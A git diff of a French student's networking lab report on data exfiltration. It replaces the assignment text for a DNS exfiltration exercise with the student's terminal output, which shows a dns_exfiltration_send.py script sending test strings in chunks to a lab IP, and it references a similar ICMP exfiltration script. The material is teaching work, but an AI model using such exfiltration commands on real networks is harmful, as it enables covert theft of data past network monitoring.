@@ -141,23 +141,20 @@ $ python icmp_exf_send_nolimit.py 10.1.1.1 "Coucou toi comment ça va broooooo"
 
 # III. Exfiltration DNS
 
-**DNS est donc un protocole qu'on peut aussi détourner de son utilisation première pour faire de l'exfiltration.**
-
-Vu qu'on va envoyer des requêtes DNS pour exfiltrer les données il faut dans l'idéal un service qui tourne pour les recevoir (port 53 UDP), et sur cette machine qui fait tourner le service, un ptit programme `scapy` qui réceptionne et traite tout ce qui est reçu. Les logs du service ça peut faire l'affaire aussi !
-
-> Bon ! Vous vous me la faites tout seul celle-ci ? Quelques recherches sur internet, y'a toute la doc du monde sur ça.
-
 🌞 **`dns_exfiltration_send.py`**
 
-- envoie des données passées en argument à l'IP passée en argument
-- utilise le protocole DNS pour exfiltrer lesdites données
-- une string de 20 caractères doit pouvoir être exfiltrée
-
-On doit pouvoir faire :
-
-```bash
-$ dns_exfiltration_send.py 10.1.1.1 toto
 ```
+fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 dns_exfiltration_send.py 10.1.1.1 toto
+Partie 1/1 exfiltrée avec succès vers 10.1.1.1.
+```
+
+```
+fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 dns_exfiltration_send.py 10.1.1.1 totototototototototototo
+Partie 1/2 exfiltrée avec succès vers 10.1.1.1.
+Partie 2/2 exfiltrée avec succès vers 10.1.1.1.
+```
+
+![DNS](images/dns_exfiltration_send.png)
 
 ⭐ **Bonus 3 mid : `dns_exfiltration_send.py`**
 
